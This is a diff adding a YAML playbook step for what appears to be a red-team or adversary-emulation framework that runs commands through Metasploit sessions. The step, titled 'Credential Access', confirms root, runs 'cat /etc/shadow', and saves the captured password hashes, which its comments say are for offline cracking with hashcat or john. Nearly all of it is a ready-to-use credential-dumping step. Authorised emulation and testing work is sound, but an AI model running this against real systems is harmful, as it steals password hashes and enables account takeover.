@@ -1,0 +1,39 @@
+# Phase 7: Credential Access - Read /etc/shadow
+#
+# /etc/shadow stores hashed passwords for all local accounts. It is readable
+# only by root. Reading it is a key post-exploitation step: the hashes can be
+# cracked offline with tools like hashcat or john.
+#
+# Variables required: $SESSION_NAME (must be root)
+# Variables set:      $SHADOW_CONTENT
+# ATT&CK: T1003.008 (OS Credential Dumping: /etc/passwd and /etc/shadow)
+
+# if you are using an ssh session instead of msf-session, adjust the command
+# types accordingly (ssh instead of msf-session) and ensure you have a persistent
+# session to run the commands in.
+
+commands:
+  # Verify we have root before attempting (the command will fail if not root)
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: id
+
+  - type: debug
+    cmd: "Current user: $RESULT_STDOUT (must be root to read /etc/shadow)"
+
+  # TODO: read the hashed passwords from /etc/shadow
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: cat /etc/shadow
+    metadata:
+      tactic: "TA0006"
+      technique: "T1003.008"
+      technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
+
+  # Store the shadow file content for later use or offline cracking
+  - type: setvar
+    variable: SHADOW_CONTENT
+    cmd: $RESULT_STDOUT
+
+  - type: debug
+    cmd: "Shadow file captured and stored in $SHADOW_CONTENT"
